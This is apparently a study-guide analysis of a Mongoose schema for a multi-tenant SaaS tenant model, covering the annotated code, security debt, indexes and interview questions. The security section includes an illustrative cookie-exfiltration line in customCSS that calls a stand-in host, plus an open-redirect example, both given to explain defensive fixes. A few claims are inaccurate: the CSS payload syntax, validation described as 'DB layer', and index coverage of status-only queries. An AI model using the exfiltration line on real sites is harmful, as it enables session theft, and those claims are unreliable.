# File Analysis: packages/db/src/tenant.ts

## File Path and Purpose

**Path:** `packages/db/src/tenant.ts`

This file defines the Mongoose schema, TypeScript interface, and model for the multi-tenant `Tenant` document — the central entity in the luxgen SaaS platform. Every request, user, and piece of content is scoped to a `Tenant`; this schema therefore encodes the entire per-tenant configuration surface: branding, security policy, feature flags, storage limits, integration settings, and storefront customization.

---

## Full Annotated Code

```typescript
import mongoose, { Schema, model, Document } from 'mongoose';

// ─── TypeScript Interfaces ────────────────────────────────────────────────────
// Defined BEFORE the schema so they serve as the source of truth.
// The schema must match these interfaces — Mongoose validates at runtime,
// TypeScript validates at compile time. Mismatches between the two are a
// common source of subtle bugs (field in interface but not schema → undefined
// at runtime; field in schema but not interface → no TS autocomplete).

export interface TenantBranding {
  logo?: string;          // Optional — tenants may not set a logo
  favicon?: string;
  primaryColor: string;   // Validated as hex (#RRGGBB) in schema
  secondaryColor: string;
  accentColor: string;
  fontFamily: string;
  customCSS?: string;     // Allows per-tenant CSS injection — XSS risk if rendered unsanitized
}

export interface TenantSecurity {
  allowedDomains: string[];   // Hostnames allowed to make requests to this tenant
  corsOrigins: string[];      // Origins allowed in the Origin header
  rateLimiting: {
    enabled: boolean;
    maxRequests: number;
    windowMs: number;
  };
  sessionTimeout: number;     // Minutes — used by frontend to expire sessions
  requireMFA: boolean;        // Feature flag — MFA enforcement
  passwordPolicy: {
    minLength: number;
    requireUppercase: boolean;
    requireLowercase: boolean;
    requireNumbers: boolean;
    requireSymbols: boolean;
  };
}

export interface TenantOnboarding {
  completedSteps: string[];   // Step IDs that have been completed
  dismissed: boolean;         // User dismissed the onboarding flow
}

export interface TenantConfig {
  features: {
    analytics: boolean;
    notifications: boolean;
    fileUpload: boolean;
    apiAccess: boolean;
    customDomain: boolean;    // Gate for custom domain feature — plan-dependent
  };
  limits: {
    maxUsers: number;         // User count cap for this tenant's plan
    maxStorage: number;       // MB
    maxApiCalls: number;      // Per billing period
  };
  integrations: {
    emailProvider?: string;
    paymentProvider?: string;
    analyticsProvider?: string;
  };
  regional?: {
    contactEmail?: string;
    timezone?: string;
    currency?: string;
  };
  storefront?: {
    landingEnabled: boolean;
    slug?: string;            // URL slug for the storefront (e.g., "mentors")
    routes: {
      landing: string;
      courses: string;
      programs: string;
      login: string;
      register: string;
    };
    content?: Record<string, unknown>; // Flexible CMS content — type-unsafe
    theme?: {
      accentColor?: string;
      warmAccentColor?: string;
      heroImage?: string;
      layout?: 'classic' | 'split';
    };
  };
}

export interface ITenant extends Document {
  name: string;
  subdomain: string;
  domain?: string;            // Custom domain (e.g., "learn.acmecorp.com")
  status: 'active' | 'suspended' | 'pending';
  settings: {
    branding: TenantBranding;
    security: TenantSecurity;
    config: TenantConfig;
    onboarding?: TenantOnboarding;
  };
  metadata: {
    createdAt: Date;
    lastActive: Date;
    createdBy: Schema.Types.ObjectId;
  };
  createdAt: Date;            // Provided by { timestamps: true }
  updatedAt: Date;
}

// ─── Schema Definition ────────────────────────────────────────────────────────

const tenantSchema = new Schema<ITenant>(
  {
    name: {
      type: String,
      required: true,
      trim: true,             // Removes leading/trailing whitespace at DB level
    },
    subdomain: {
      type: String,
      required: true,
      unique: true,           // Creates a unique index automatically
      lowercase: true,        // Normalizes to lowercase before save
      trim: true,
      match: [/^[a-z0-9-]+$/, 'Subdomain can only contain lowercase letters, numbers, and hyphens'],
      // Regex enforces slug format. Prevents subdomains like "my tenant" (space)
      // or "tenant.sub" (dot) which would break subdomain routing.
    },
    domain: {
      type: String,
      trim: true,
      lowercase: true,
      // No unique constraint here. If two tenants both set domain: undefined,
      // a unique index would reject the second (MongoDB unique indexes include null).
      // This is the correct choice — but means we must enforce uniqueness in
      // application code when a domain IS provided.
    },
    status: {
      type: String,
      enum: ['active', 'suspended', 'pending'],
      default: 'active',
      // Enum validation at DB level. Mongoose rejects invalid status values.
    },
    settings: {
      branding: {
        logo: String,
        favicon: String,
        primaryColor: {
          type: String,
          default: '#3B82F6',     // Tailwind blue-500
          match: [/^#[0-9A-Fa-f]{6}$/, 'Primary color must be a valid hex color'],
          // Regex validates hex color format. Prevents injection via CSS color values.
          // Does NOT validate 3-char shorthand (#RGB) — intentional, 6-char only.
        },
        secondaryColor: { type: String, default: '#6B7280', match: [/^#[0-9A-Fa-f]{6}$/, '...'] },
        accentColor:    { type: String, default: '#10B981', match: [/^#[0-9A-Fa-f]{6}$/, '...'] },
        fontFamily:     { type: String, default: 'Inter, system-ui, sans-serif' },
        customCSS: String,
        // customCSS has NO length limit or content validation in the schema.
        // This is a significant attack surface: a compromised admin account could
        // inject arbitrary CSS including CSS-based data exfiltration attacks.
      },
      security: {
        allowedDomains: [String],   // Array of strings — no format validation
        corsOrigins: [String],      // No URL format validation either
        rateLimiting: {
          enabled:     { type: Boolean, default: true },
          maxRequests: { type: Number,  default: 1000 },
          windowMs:    { type: Number,  default: 900000 }, // 15 minutes in ms
        },
        sessionTimeout: { type: Number, default: 480 }, // 8 hours in minutes
        requireMFA:     { type: Boolean, default: false },
        passwordPolicy: {
          minLength:        { type: Number, default: 8 },
          requireUppercase: { type: Boolean, default: true },
          requireLowercase: { type: Boolean, default: true },
          requireNumbers:   { type: Boolean, default: true },
          requireSymbols:   { type: Boolean, default: false },
        },
      },
      onboarding: {
        completedSteps: { type: [String], default: [] },
        dismissed:      { type: Boolean, default: false },
      },
      config: {
        features: {
          analytics:    { type: Boolean, default: true },
          notifications: { type: Boolean, default: true },
          fileUpload:   { type: Boolean, default: true },
          apiAccess:    { type: Boolean, default: true },
          customDomain: { type: Boolean, default: false }, // Off by default — paid feature
        },
        limits: {
          maxUsers:   { type: Number, default: 100 },
          maxStorage: { type: Number, default: 1024 },    // 1 GB in MB
          maxApiCalls: { type: Number, default: 10000 },
        },
        integrations: {
          emailProvider:     String,
          paymentProvider:   String,
          analyticsProvider: String,
        },
        regional: {
          contactEmail: String,
          timezone: String,
          currency: String,
        },
        storefront: {
          landingEnabled: { type: Boolean, default: false },
          slug: {
            type: String,
            default: 'mentors',
            match: [/^[a-z0-9-]+$/, 'Slug can only contain lowercase letters, numbers, and hyphens'],
          },
          routes: {
            landing:  { type: String, default: '/store/mentors' },
            courses:  { type: String, default: '/learn' },
            programs: { type: String, default: '/store/product' },
            login:    { type: String, default: '/login' },
            register: { type: String, default: '/register' },
            // Route values are not validated as safe paths.
            // A compromised admin could set routes.login to an external URL
            // creating an open redirect. Should validate path starts with '/'.
          },
          content: { type: Schema.Types.Mixed },
          // Schema.Types.Mixed = no schema enforcement. Accepts any value.
          // Good for flexible CMS content; bad for security if content is
          // rendered without sanitization.
          theme: { type: Schema.Types.Mixed },
        },
      },
    },
    metadata: {
      createdAt:  { type: Date, default: Date.now },
      lastActive: { type: Date, default: Date.now },
      createdBy:  { type: Schema.Types.ObjectId, ref: 'User' },
    },
  },
  {
    timestamps: true, // Adds createdAt and updatedAt managed by Mongoose
    // Note: metadata.createdAt duplicates the timestamps createdAt field.
    // This is redundant — either use timestamps: true OR metadata.createdAt,
    // not both. Could cause confusion about which is authoritative.
  },
);

// ─── Indexes ──────────────────────────────────────────────────────────────────

tenantSchema.index({ subdomain: 1 });
// Supports: Tenant.findOne({ subdomain }) — the most common query pattern.
// Note: subdomain has unique: true above, which already creates an index.
// This explicit index declaration is REDUNDANT for subdomain — the unique
// constraint creates the same index. Not harmful, just wasteful.

tenantSchema.index({ domain: 1 });
// Supports: Tenant.findOne({ domain }) — custom domain resolution.
// Correct: domain has no unique constraint, so this is the only index for it.

tenantSchema.index({ status: 1 });
// Supports: status-filtered queries like Tenant.find({ status: 'active' }).
// In practice most queries combine status with subdomain/domain, so a
// compound index { subdomain: 1, status: 1 } would be more efficient than
// two separate indexes. The query planner may not use both indexes.

// ─── Model export with Next.js/hot-reload guard ───────────────────────────────

export const Tenant =
  (mongoose.models.Tenant as mongoose.Model<ITenant>) || model<ITenant>('Tenant', tenantSchema);
// The ternary prevents "Cannot overwrite `Tenant` model once compiled" error
// in development environments with hot module reloading (Next.js, ts-node with --watch).
// In production (cold start), mongoose.models.Tenant is always undefined,
// so model() is always called — no performance concern.
```

---

## Exported Functions / Constants

| Export | Type | Description |
|---|---|---|
| `TenantBranding` | `interface` | TypeScript type for branding settings |
| `TenantSecurity` | `interface` | TypeScript type for security settings |
| `TenantOnboarding` | `interface` | TypeScript type for onboarding state |
| `TenantConfig` | `interface` | TypeScript type for feature flags, limits, integrations |
| `ITenant` | `interface extends Document` | Full Mongoose document type |
| `Tenant` | `mongoose.Model<ITenant>` | The compiled Mongoose model (singleton) |

No functions are exported — this is a data model file. All operations are via `Tenant.findOne`, `Tenant.findById`, `Tenant.create`, etc.

---

## Design Patterns Used

**Interface-First Design:** TypeScript interfaces are defined before the schema. This is the correct order — the interface is the contract; the schema implements it.

**Schema-Level Validation:** `match`, `enum`, `required`, `unique`, `trim`, `lowercase` are all Mongoose schema validators, not application-level guards. Validation happens in the DB layer regardless of how the model is used, which prevents invalid data from reaching the DB even through direct model calls.

**Hot-Reload Guard (Mongoose Model Caching):** The `mongoose.models.Tenant || model(...)` pattern is standard for Node.js environments that re-evaluate modules (Next.js dev server, Jest, ts-node watch).

**Embedded Documents (Sub-schemas):** All settings, metadata, branding, and config are embedded documents rather than references. This is the correct MongoDB pattern for tightly coupled data that is always queried together. The alternative (separate `TenantSettings` collection) would require joins (lookups) on every read.

---

## Security Considerations

**Well-designed:**
- `subdomain` validates against `/^[a-z0-9-]+$/` — prevents subdomain injection, path traversal, and script-tag-in-subdomain attacks
- `primaryColor` / `secondaryColor` / `accentColor` validated as `#RRGGBB` hex — prevents CSS injection via color values (e.g., `expression(...)` in legacy IE)
- `status: 'active'` filter is enforced at query level in all tenant lookups

**Security debt:**
1. **`customCSS` has no length limit or content filter.** A compromised admin can inject `@import url('https://evil.com/exfil?' + document.cookie)`. Should: enforce a character length limit (e.g., 50KB) and optionally run through a CSS sanitizer.
2. **`storefront.routes.*` fields are not validated as safe relative paths.** Setting `routes.login = 'https://phishing.example.com/login'` would create an open redirect. Validate: `value.startsWith('/')`.
3. **`storefront.content` and `theme` are `Schema.Types.Mixed`.** If any content from these fields is server-side rendered without sanitization, it is an XSS vector.
4. **`domain` field has no uniqueness constraint.** Two tenants can be assigned the same custom domain. The application-level code must enforce this. A unique sparse index would be the DB-level fix: `tenantSchema.index({ domain: 1 }, { unique: true, sparse: true })`.

---

## Performance Considerations

- **Redundant index on `subdomain`:** The `unique: true` on the field already creates an index. The explicit `tenantSchema.index({ subdomain: 1 })` is a no-op that adds noise to `db.getIndexes()`.
- **Three separate single-field indexes vs compound:** Tenant lookups are almost always `{ subdomain, status: 'active' }` or `{ domain, status: 'active' }`. A compound index `{ subdomain: 1, status: 1 }` would be significantly faster for these patterns (the query planner can satisfy both predicates from one index scan).
- **`Schema.Types.Mixed` for `content` and `theme`:** Mongoose cannot optimize queries on Mixed fields. If any query needs to filter or sort by content/theme sub-fields, the full document must be loaded and filtered in application code. Acceptable here since these are display-only fields, not query predicates.
- **Embedded documents mean large documents:** A tenant document with full branding + security + config + onboarding could be 5-10KB. In a system with 100k tenants and high concurrency, this increases MongoDB RAM requirements. If `settings` is rarely changed but always fetched, consider using `select` to project only needed fields in hot paths.

---

## 10 Interview Questions

1. Why is the `Tenant` model exported as `mongoose.models.Tenant || model('Tenant', tenantSchema)` rather than just `model('Tenant', tenantSchema)`?
2. What is a Mongoose sparse index and when would you use one on the `domain` field?
3. Explain the difference between embedding tenant settings vs. referencing a separate `TenantSettings` collection. What are the tradeoffs for this use case?
4. The `subdomain` field has both `unique: true` and an explicit `tenantSchema.index({ subdomain: 1 })`. What problem does this cause and how would you fix it?
5. What is `Schema.Types.Mixed` in Mongoose? What are the tradeoffs of using it for `storefront.content`?
6. How does `metadata.createdAt` differ from `createdAt` added by `timestamps: true`? Which should be used?
7. What is the performance difference between `Tenant.findOne({ subdomain })` and `Tenant.findOne({ subdomain, status: 'active' })` given the current indexes?
8. The `customCSS` field allows arbitrary string values. Describe two different attack vectors this enables and how you would mitigate each.
9. Why does the `status` field use `enum: ['active', 'suspended', 'pending']` in the schema when it's already typed as a union in the TypeScript interface?
10. If you needed to add a `tier` field (enum: 'free' | 'pro' | 'enterprise') to `TenantConfig.limits`, what changes would be needed in both the interface and the schema? What migration is required for existing documents?

---

## What Would You Change? — 3 Concrete Improvements

**1. Add unique sparse index on `domain` and remove duplicate subdomain index:**
```typescript
// Remove: tenantSchema.index({ subdomain: 1 }); // already covered by unique: true
tenantSchema.index({ domain: 1 }, { unique: true, sparse: true });
// sparse: true means documents where domain is undefined are excluded from the
// unique constraint — only documents WITH a domain must have a unique one.
```

**2. Replace separate indexes with compound indexes:**
```typescript
tenantSchema.index({ subdomain: 1, status: 1 }); // covers the most common lookup
tenantSchema.index({ domain: 1, status: 1 }, { sparse: true });
// Eliminates the need for a separate status index while supporting both
// the common lookup pattern and status-only queries (via partial index scan).
```

**3. Add `customCSS` length limit and `storefront.routes` path validation:**
```typescript
customCSS: {
  type: String,
  maxlength: [51200, 'Custom CSS cannot exceed 50KB'], // 50 * 1024
},
// For storefront routes, add a validator:
routes: {
  landing: {
    type: String,
    default: '/store/mentors',
    validate: {
      validator: (v: string) => v.startsWith('/'),
      message: 'Route must be a relative path starting with /',
    },
  },
  // ... same for all routes
}
```

---

## Related Concepts to Review

- MongoDB schema design: embedding vs. referencing tradeoffs
- Mongoose schema types: `String`, `Number`, `Boolean`, `ObjectId`, `Mixed`, `Array`
- MongoDB index types: single-field, compound, unique, sparse, partial
- Mongoose model caching and the hot-reload problem
- MongoDB document size limit (16MB) and when it becomes relevant
- TypeScript `extends Document` for Mongoose type definitions
- CSS injection attacks and sanitization strategies
